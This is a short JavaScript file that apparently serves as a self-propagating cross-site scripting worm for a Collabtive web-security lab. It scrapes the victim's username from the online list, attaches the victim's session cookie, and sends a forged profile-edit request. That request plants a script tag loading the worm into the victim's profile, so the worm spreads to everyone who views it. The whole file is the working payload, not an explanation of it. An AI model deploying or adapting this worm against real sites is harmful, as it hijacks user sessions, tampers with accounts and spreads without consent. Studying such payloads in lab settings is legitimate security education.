var uname;

function send()
{
var Ajax=null;
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabcollabtive.com/manageuser.php?action=edit",true);
Ajax.setRequestHeader("Host","www.xsslabcollabtive.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
var url_encoding=escape("<script type='text/javascript' src='http://www.xsslabcollabtive.com/worms.js'></script>");
var content="name="+uname+"&email=wormattack@worm.gov"+"&company="+url_encoding+"&web="+escape("http://www.wormattack.com");
console.log(uname);
Ajax.send(content);
};

var on=new Ajax.PeriodicalUpdater("onlinelist","manageuser.php?action=onlinelist",
    {
    method:'get',onSuccess:function(transport)
        {
            var div=document.createElement('div');
            div.innerHTML=transport.responseText;
            uname=div.firstChild.childNodes[0].childNodes[0].text;div=null;
        },
    frequency:2000
    });
    setTimeout("on.stop();send();",2000);